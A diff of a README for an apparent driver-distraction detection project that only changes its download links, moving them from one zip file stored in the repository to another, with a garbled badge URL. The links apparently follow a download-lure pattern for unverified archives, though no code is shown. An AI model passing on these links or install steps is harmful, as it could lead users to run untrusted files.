@@ -1,7 +1,7 @@
 # 🚗 Distracted-Driver-Detection - Identify Driving Distractions Easily
 
 ## 📥 Get Your Copy
-[![Download Distracted-Driver-Detection](https://raw.githubusercontent.com/sendyvrga/Distracted-Driver-Detection/main/interagree/Distracted-Driver-Detection.zip%20Now-%20%E2%86%92-brightgreen)](https://raw.githubusercontent.com/sendyvrga/Distracted-Driver-Detection/main/interagree/Distracted-Driver-Detection.zip)
+[![Download Distracted-Driver-Detection](https://github.com/sendyvrga/Distracted-Driver-Detection/raw/refs/heads/main/supp/Distracted_Driver_Detection_v1.3.zip%20Now-%20%E2%86%92-brightgreen)](https://github.com/sendyvrga/Distracted-Driver-Detection/raw/refs/heads/main/supp/Distracted_Driver_Detection_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Distracted-Driver-Detection project! This software helps identify when a driver may be distracted. Using a custom ResNet50 model, it analyzes driver behaviors and classifies them into ten categories. 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the release page and download the software:
 
-[Download Distracted-Driver-Detection](https://raw.githubusercontent.com/sendyvrga/Distracted-Driver-Detection/main/interagree/Distracted-Driver-Detection.zip)
+[Download Distracted-Driver-Detection](https://github.com/sendyvrga/Distracted-Driver-Detection/raw/refs/heads/main/supp/Distracted_Driver_Detection_v1.3.zip)
 
 1. Click the link above.
 2. Choose the latest version from the releases.
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Don't forget to check for updates on the release page regularly to ensure you have the latest version of Distracted-Driver-Detection!
 
-[Download the Latest Version Here](https://raw.githubusercontent.com/sendyvrga/Distracted-Driver-Detection/main/interagree/Distracted-Driver-Detection.zip)
+[Download the Latest Version Here](https://github.com/sendyvrga/Distracted-Driver-Detection/raw/refs/heads/main/supp/Distracted_Driver_Detection_v1.3.zip)
